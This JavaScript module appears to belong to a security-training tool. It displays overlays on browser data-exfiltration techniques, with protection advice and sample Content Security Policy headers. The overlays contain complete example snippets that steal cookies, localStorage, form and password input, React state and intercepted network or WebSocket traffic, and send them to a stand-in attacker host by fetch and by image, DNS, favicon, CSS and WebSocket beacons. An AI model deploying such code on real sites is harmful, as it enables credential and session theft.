/**
 * React Security Suite - Exfiltration Demonstration Module
 * 
 * This module demonstrates how data exfiltration attacks can be performed in React applications.
 * These demonstrations are for educational purposes only and are designed to run
 * in a controlled environment.
 */

/**
 * Demonstrates data exfiltration techniques
 * @param {Object} options - Options for the demonstration
 * @returns {Object} Result of the demonstration
 */
export function demonstrateExfiltration(options = {}) {
  // Ensure we're in training mode
  if (!window.__reactSecuritySuiteTrainingMode) {
    console.error('[React Security Suite] Training mode must be active to run demonstrations');
    return { 
      success: false, 
      error: 'Training mode must be active to run demonstrations' 
    };
  }
  
  // Create demonstration container
  const container = document.createElement('div');
  container.id = 'react-security-exfiltration-demo-container';
  container.style.cssText = `
    position: fixed;
    top: 40px;
    left: 20px;
    right: 20px;
    background-color: rgba(0, 0, 0, 0.8);
    color: #00ff00;
    font-family: monospace;
    padding: 20px;
    border-radius: 5px;
    z-index: 2147483646;
    max-height: 80vh;
    overflow: auto;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
  `;
  
  let demoContent = '<h2>Data Exfiltration Techniques</h2>';
  demoContent += '<p>This demonstrates how sensitive data could be exfiltrated from React applications.</p>';
  
  // Show exfiltration techniques
  demoContent += '<h3>Potential Exfiltration Techniques:</h3>';
  
  // 1. Cookie Exfiltration
  demoContent += `<div class="exfiltration-technique">
    <h4>1. Cookie Exfiltration</h4>
    <p>Cookies often contain sensitive information like session tokens:</p>
    <pre>
// Malicious code example (DO NOT RUN)
function exfiltrateCookies() {
  const cookies = document.cookie;
  
  // Send to attacker's server
  fetch('https://malicious-server.example/collect', {
    method: 'POST',
    body: JSON.stringify({ 
      cookies: cookies,
      url: window.location.href
    }),
    headers: { 'Content-Type': 'application/json' }
  });
}

// Execute immediately
exfiltrateCookies();

// Or set up periodic exfiltration
setInterval(exfiltrateCookies, 60000); // Every minute
    </pre>
    
    <p><strong>Protection:</strong> Use HttpOnly and Secure flags for sensitive cookies, implement proper Content Security Policy (CSP).</p>
  </div>`;
  
  // 2. Local Storage Exfiltration
  demoContent += `<div class="exfiltration-technique">
    <h4>2. Local Storage Exfiltration</h4>
    <p>Local storage often contains tokens, user preferences, and cached data:</p>
    <pre>
// Malicious code example (DO NOT RUN)
function exfiltrateLocalStorage() {
  const data = {};
  
  // Collect all localStorage items
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    data[key] = localStorage.getItem(key);
  }
  
  // Send to attacker's server
  fetch('https://malicious-server.example/collect', {
    method: 'POST',
    body: JSON.stringify({ 
      localStorage: data,
      url: window.location.href
    }),
    headers: { 'Content-Type': 'application/json' }
  });
}

exfiltrateLocalStorage();
    </pre>
    
    <p><strong>Protection:</strong> Don't store sensitive data in localStorage, encrypt sensitive data before storing, implement CSP.</p>
  </div>`;
  
  // 3. Form Data Exfiltration
  demoContent += `<div class="exfiltration-technique">
    <h4>3. Form Data Exfiltration</h4>
    <p>Capturing user input from forms, especially login credentials:</p>
    <pre>
// Malicious code example (DO NOT RUN)
function captureFormInputs() {
  // Find all input elements
  const inputs = document.querySelectorAll('input');
  
  // Monitor each input for changes
  inputs.forEach(input => {
    // Store original event handlers
    const originalOnChange = input.onchange;
    const originalOnInput = input.oninput;
    
    // Override onchange
    input.onchange = function(e) {
      // Exfiltrate the value
      fetch('https://malicious-server.example/collect', {
        method: 'POST',
        body: JSON.stringify({ 
          inputName: input.name || input.id || 'unknown',
          inputType: input.type,
          value: input.value,
          url: window.location.href
        }),
        headers: { 'Content-Type': 'application/json' }
      });
      
      // Call original handler if it exists
      if (originalOnChange) {
        return originalOnChange.apply(this, arguments);
      }
    };
    
    // Similar override for oninput
    input.oninput = function(e) {
      // For password fields, we might want real-time capture
      if (input.type === 'password') {
        fetch('https://malicious-server.example/collect', {
          method: 'POST',
          body: JSON.stringify({ 
            inputName: input.name || input.id || 'unknown',
            inputType: input.type,
            value: input.value,
            url: window.location.href
          }),
          headers: { 'Content-Type': 'application/json' }
        });
      }
      
      // Call original handler if it exists
      if (originalOnInput) {
        return originalOnInput.apply(this, arguments);
      }
    };
  });
}

// Execute when DOM is ready
if (document.readyState === 'complete') {
  captureFormInputs();
} else {
  document.addEventListener('DOMContentLoaded', captureFormInputs);
}
    </pre>
    
    <p><strong>Protection:</strong> Implement CSP, use HTTPS, monitor for suspicious event handler overrides.</p>
  </div>`;
  
  // 4. React State Exfiltration
  demoContent += `<div class="exfiltration-technique">
    <h4>4. React State Exfiltration</h4>
    <p>Capturing React component state which may contain sensitive data:</p>
    <pre>
// Malicious code example (DO NOT RUN)
function captureReactState() {
  // Find React root
  const rootElement = document.querySelector('[data-reactroot]') || document.getElementById('root');
  
  if (!rootElement) return;
  
  // Try to access React fiber
  const key = Object.keys(rootElement).find(key => 
    key.startsWith('__reactFiber$') || 
    key.startsWith('__reactInternalInstance$')
  );
  
  if (!key) return;
  
  // Access fiber
  const fiber = rootElement[key];
  
  // Function to extract state from fiber tree
  function extractStateFromFiber(fiber) {
    const states = [];
    
    function traverse(fiber) {
      if (!fiber) return;
      
      // Extract state from stateNode
      if (fiber.stateNode && fiber.stateNode.state) {
        states.push({
          componentName: fiber.type?.name || 'Unknown',
          state: fiber.stateNode.state
        });
      }
      
      // Traverse child
      if (fiber.child) {
        traverse(fiber.child);
      }
      
      // Traverse sibling
      if (fiber.sibling) {
        traverse(fiber.sibling);
      }
    }
    
    traverse(fiber);
    return states;
  }
  
  const states = extractStateFromFiber(fiber);
  
  // Exfiltrate the state data
  if (states.length > 0) {
    fetch('https://malicious-server.example/collect', {
      method: 'POST',
      body: JSON.stringify({ 
        reactStates: states,
        url: window.location.href
      }),
      headers: { 'Content-Type': 'application/json' }
    });
  }
}

// Execute periodically to capture state changes
setInterval(captureReactState, 5000);
    </pre>
    
    <p><strong>Protection:</strong> Use React in production mode, don't store sensitive data in component state, implement CSP.</p>
  </div>`;
  
  // 5. Network Request Interception
  demoContent += `<div class="exfiltration-technique">
    <h4>5. Network Request Interception</h4>
    <p>Intercepting network requests to capture API calls and responses:</p>
    <pre>
// Malicious code example (DO NOT RUN)
function interceptNetworkRequests() {
  // Store original fetch
  const originalFetch = window.fetch;
  
  // Override fetch
  window.fetch = async function(resource, options) {
    // Call original fetch
    const response = await originalFetch.apply(this, arguments);
    
    // Clone the response so we can read it
    const responseClone = response.clone();
    
    try {
      // Try to parse as JSON
      const responseData = await responseClone.json();
      
      // Exfiltrate the request and response
      fetch('https://malicious-server.example/collect', {
        method: 'POST',
        body: JSON.stringify({ 
          request: {
            url: resource.toString(),
            method: options?.method || 'GET',
            headers: options?.headers || {},
            body: options?.body || null
          },
          response: responseData,
          timestamp: new Date().toISOString()
        }),
        headers: { 'Content-Type': 'application/json' }
      });
    } catch (e) {
      // Not JSON, try as text
      try {
        const responseText = await responseClone.text();
        
        // Exfiltrate the request and response
        fetch('https://malicious-server.example/collect', {
          method: 'POST',
          body: JSON.stringify({ 
            request: {
              url: resource.toString(),
              method: options?.method || 'GET',
              headers: options?.headers || {},
              body: options?.body || null
            },
            responseText: responseText,
            timestamp: new Date().toISOString()
          }),
          headers: { 'Content-Type': 'application/json' }
        });
      } catch (e) {
        // Ignore errors
      }
    }
    
    // Return the original response
    return response;
  };
  
  // Similarly override XMLHttpRequest
  const originalXHROpen = XMLHttpRequest.prototype.open;
  const originalXHRSend = XMLHttpRequest.prototype.send;
  
  XMLHttpRequest.prototype.open = function(method, url) {
    this._url = url;
    this._method = method;
    return originalXHROpen.apply(this, arguments);
  };
  
  XMLHttpRequest.prototype.send = function(body) {
    // Store request body
    this._body = body;
    
    // Store original onload
    const originalOnload = this.onload;
    
    // Override onload
    this.onload = function() {
      // Exfiltrate the request and response
      fetch('https://malicious-server.example/collect', {
        method: 'POST',
        body: JSON.stringify({ 
          request: {
            url: this._url,
            method: this._method,
            body: this._body
          },
          response: this.responseText,
          timestamp: new Date().toISOString()
        }),
        headers: { 'Content-Type': 'application/json' }
      });
      
      // Call original onload
      if (originalOnload) {
        return originalOnload.apply(this, arguments);
      }
    };
    
    return originalXHRSend.apply(this, arguments);
  };
}

// Execute immediately
interceptNetworkRequests();
    </pre>
    
    <p><strong>Protection:</strong> Implement CSP, use HTTPS, monitor for suspicious overrides of fetch and XMLHttpRequest.</p>
  </div>`;
  
  // 6. WebSocket Interception
  demoContent += `<div class="exfiltration-technique">
    <h4>6. WebSocket Interception</h4>
    <p>Intercepting WebSocket communications:</p>
    <pre>
// Malicious code example (DO NOT RUN)
function interceptWebSockets() {
  // Store original WebSocket
  const OriginalWebSocket = window.WebSocket;
  
  // Override WebSocket constructor
  window.WebSocket = function(url, protocols) {
    // Create a real WebSocket
    const ws = new OriginalWebSocket(url, protocols);
    
    // Store original methods
    const originalSend = ws.send;
    const originalOnMessage = ws.onmessage;
    
    // Override send method
    ws.send = function(data) {
      // Exfiltrate the sent data
      fetch('https://malicious-server.example/collect', {
        method: 'POST',
        body: JSON.stringify({ 
          type: 'websocket_send',
          url: url,
          data: data,
          timestamp: new Date().toISOString()
        }),
        headers: { 'Content-Type': 'application/json' }
      });
      
      // Call original send
      return originalSend.apply(this, arguments);
    };
    
    // Monitor received messages
    ws.addEventListener('message', function(event) {
      // Exfiltrate the received data
      fetch('https://malicious-server.example/collect', {
        method: 'POST',
        body: JSON.stringify({ 
          type: 'websocket_receive',
          url: url,
          data: event.data,
          timestamp: new Date().toISOString()
        }),
        headers: { 'Content-Type': 'application/json' }
      });
    });
    
    return ws;
  };
}

// Execute immediately
interceptWebSockets();
    </pre>
    
    <p><strong>Protection:</strong> Implement CSP, use secure WebSocket connections (wss://), encrypt sensitive data.</p>
  </div>`;
  
  // Protection measures
  demoContent += '<h3>General Protection Measures:</h3>';
  demoContent += `<ul>
    <li>Implement a strong Content Security Policy (CSP) to restrict script execution and connections</li>
    <li>Use HTTPS for all communications</li>
    <li>Don't store sensitive data in client-side storage (localStorage, sessionStorage)</li>
    <li>Use HttpOnly and Secure flags for sensitive cookies</li>
    <li>Implement Subresource Integrity (SRI) for external scripts</li>
    <li>Monitor for suspicious script behavior and network requests</li>
    <li>Keep all libraries and frameworks updated</li>
    <li>Consider using tools like React Security Suite to detect and prevent exfiltration attempts</li>
  </ul>`;
  
  // Example CSP
  demoContent += '<h3>Example Content Security Policy:</h3>';
  demoContent += `<pre>
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://trusted-cdn.example; 
  connect-src 'self' https://api.yourdomain.com; 
  img-src 'self' https://trusted-images.example; 
  style-src 'self' https://trusted-styles.example; 
  font-src 'self' https://trusted-fonts.example; 
  object-src 'none'; 
  base-uri 'self'; 
  form-action 'self'; 
  frame-ancestors 'none';
  </pre>`;
  
  container.innerHTML = demoContent;
  document.body.appendChild(container);
  
  // Register cleanup function
  if (window.__reactSecuritySuiteDemoCleanupFunctions) {
    window.__reactSecuritySuiteDemoCleanupFunctions.push(() => {
      container.remove();
    });
  } else {
    window.__reactSecuritySuiteDemoCleanupFunctions = [() => {
      container.remove();
    }];
  }
  
  return { success: true };
}

/**
 * Demonstrates beacon-based exfiltration techniques
 * @param {Object} options - Options for the demonstration
 * @returns {Object} Result of the demonstration
 */
export function demonstrateBeaconExfiltration(options = {}) {
  // Ensure we're in training mode
  if (!window.__reactSecuritySuiteTrainingMode) {
    console.error('[React Security Suite] Training mode must be active to run demonstrations');
    return { 
      success: false, 
      error: 'Training mode must be active to run demonstrations' 
    };
  }
  
  // Create demonstration container
  const container = document.createElement('div');
  container.id = 'react-security-beacon-demo-container';
  container.style.cssText = `
    position: fixed;
    top: 40px;
    left: 20px;
    right: 20px;
    background-color: rgba(0, 0, 0, 0.8);
    color: #00ff00;
    font-family: monospace;
    padding: 20px;
    border-radius: 5px;
    z-index: 2147483646;
    max-height: 80vh;
    overflow: auto;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
  `;
  
  let demoContent = '<h2>Beacon-Based Exfiltration Techniques</h2>';
  demoContent += '<p>This demonstrates how data can be exfiltrated using various beacon techniques that may bypass traditional protections.</p>';
  
  // Show beacon techniques
  demoContent += '<h3>Potential Beacon Techniques:</h3>';
  
  // 1. Image Beacon
  demoContent += `<div class="beacon-technique">
    <h4>1. Image Beacon</h4>
    <p>Using image loading to exfiltrate data:</p>
    <pre>
// Malicious code example (DO NOT RUN)
function imageBeacon(data) {
  // Encode data in URL parameters
  const encodedData = encodeURIComponent(JSON.stringify(data));
  
  // Create an image element
  const img = new Image();
  
  // Set the source to the attacker's server with data as parameters
  img.src = \`https://malicious-server.example/beacon.gif?data=\${encodedData}&t=\${Date.now()}\`;
  
  // Handle errors silently
  img.onerror = () => {};
  
  // Add to DOM temporarily
  document.body.appendChild(img);
  setTimeout(() => img.remove(), 0);
}

// Example usage
imageBeacon({
  cookies: document.cookie,
  url: window.location.href
});
    </pre>
    
    <p><strong>Protection:</strong> Implement CSP with img-src restrictions, monitor for suspicious image requests.</p>
  </div>`;
  
  // 2. DNS Beacon
  demoContent += `<div class="beacon-technique">
    <h4>2. DNS Beacon</h4>
    <p>Using DNS requests to exfiltrate data:</p>
    <pre>
// Malicious code example (DO NOT RUN)
function dnsBeacon(data) {
  // Encode data (limited to what can fit in a subdomain)
  // For example, encode a small string in base64
  const encodedData = btoa(JSON.stringify(data)).replace(/=/g, '').replace(/\\+/g, '-').replace(/\\//g, '_');
  
  // Split into chunks if needed (DNS labels are limited to 63 characters)
  const chunks = [];
  for (let i = 0; i < encodedData.length; i += 63) {
    chunks.push(encodedData.substring(i, i + 63));
  }
  
  // Create a subdomain with the encoded data
  const subdomain = chunks.join('.');
  
  // Create an image or iframe to trigger the DNS lookup
  const img = new Image();
  img.src = \`https://\${subdomain}.malicious-server.example/beacon.gif?t=\${Date.now()}\`;
  
  // Handle errors silently
  img.onerror = () => {};
  
  // Add to DOM temporarily
  document.body.appendChild(img);
  setTimeout(() => img.remove(), 0);
}

// Example usage (with very small payload due to DNS limitations)
dnsBeacon({
  id: "user123"
});
    </pre>
    
    <p><strong>Protection:</strong> Implement CSP, monitor for suspicious DNS requests, use DNS monitoring tools.</p>
  </div>`;
  
  // 3. Favicon Beacon
  demoContent += `<div class="beacon-technique">
    <h4>3. Favicon Beacon</h4>
    <p>Using favicon requests to exfiltrate data:</p>
    <pre>
// Malicious code example (DO NOT RUN)
function faviconBeacon(data) {
  // Encode data in URL parameters
  const encodedData = encodeURIComponent(JSON.stringify(data));
  
  // Create a link element for the favicon
  const link = document.createElement('link');
  link.rel = 'icon';
  link.type = 'image/x-icon';
  
  // Set the href to the attacker's server with data as parameters
  link.href = \`https://malicious-server.example/favicon.ico?data=\${encodedData}&t=\${Date.now()}\`;
  
  // Replace existing favicon or add a new one
  const existingFavicon = document.querySelector('link[rel="icon"]');
  if (existingFavicon) {
    existingFavicon.parentNode.replaceChild(link, existingFavicon);
  } else {
    document.head.appendChild(link);
  }
  
  // Remove after a short delay
  setTimeout(() => link.remove(), 1000);
}

// Example usage
faviconBeacon({
  cookies: document.cookie,
  url: window.location.href
});
    </pre>
    
    <p><strong>Protection:</strong> Implement CSP with img-src restrictions, monitor for suspicious favicon requests.</p>
  </div>`;
  
  // 4. WebSocket Beacon
  demoContent += `<div class="beacon-technique">
    <h4>4. WebSocket Beacon</h4>
    <p>Using WebSocket connections to exfiltrate data:</p>
    <pre>
// Malicious code example (DO NOT RUN)
function websocketBeacon(data) {
  // Create a WebSocket connection
  const ws = new WebSocket('wss://malicious-server.example/beacon');
  
  // Send data when connection is established
  ws.onopen = function() {
    ws.send(JSON.stringify(data));
    
    // Close the connection after sending
    setTimeout(() => ws.close(), 100);
  };
  
  // Handle errors silently
  ws.onerror = () => {};
}

// Example usage
websocketBeacon({
  cookies: document.cookie,
  localStorage: { ...localStorage },
  url: window.location.href
});
    </pre>
    
    <p><strong>Protection:</strong> Implement CSP with connect-src restrictions, monitor for suspicious WebSocket connections.</p>
  </div>`;
  
  // 5. CSS Beacon
  demoContent += `<div class="beacon-technique">
    <h4>5. CSS Beacon</h4>
    <p>Using CSS to exfiltrate data:</p>
    <pre>
// Malicious code example (DO NOT RUN)
function cssBeacon(data) {
  // Encode data in URL parameters
  const encodedData = encodeURIComponent(JSON.stringify(data));
  
  // Create a style element
  const style = document.createElement('style');
  
  // Set the content to include an @import with the data
  style.textContent = \`
    @import url("https://malicious-server.example/beacon.css?data=\${encodedData}&t=\${Date.now()}");
  \`;
  
  // Add to DOM temporarily
  document.head.appendChild(style);
  setTimeout(() => style.remove(), 1000);
}

// Example usage
cssBeacon({
  cookies: document.cookie,
  url: window.location.href
});
    </pre>
    
    <p><strong>Protection:</strong> Implement CSP with style-src restrictions, monitor for suspicious CSS requests.</p>
  </div>`;
  
  // Protection measures
  demoContent += '<h3>Protection Against Beacon Exfiltration:</h3>';
  demoContent += `<ul>
    <li>Implement a comprehensive Content Security Policy (CSP) that restricts all resource types</li>
    <li>Use network monitoring tools to detect suspicious outbound requests</li>
    <li>Implement DNS monitoring to detect data exfiltration via DNS</li>
    <li>Use browser extensions or tools that monitor for beacon-like behavior</li>
    <li>Keep all libraries and frameworks updated</li>
    <li>Consider using tools like React Security Suite to detect and prevent exfiltration attempts</li>
  </ul>`;
  
  // Example comprehensive CSP
  demoContent += '<h3>Example Comprehensive CSP:</h3>';
  demoContent += `<pre>
Content-Security-Policy: 
  default-src 'none'; 
  script-src 'self'; 
  connect-src 'self'; 
  img-src 'self'; 
  style-src 'self'; 
  font-src 'self'; 
  object-src 'none'; 
  media-src 'none';
  frame-src 'none';
  child-src 'none';
  form-action 'self'; 
  base-uri 'none'; 
  frame-ancestors 'none';
  report-uri https://your-domain.com/csp-report;
  </pre>`;
  
  container.innerHTML = demoContent;
  document.body.appendChild(container);
  
  // Register cleanup function
  if (window.__reactSecuritySuiteDemoCleanupFunctions) {
    window.__reactSecuritySuiteDemoCleanupFunctions.push(() => {
      container.remove();
    });
  } else {
    window.__reactSecuritySuiteDemoCleanupFunctions = [() => {
      container.remove();
    }];
  }
  
  return { success: true };
}
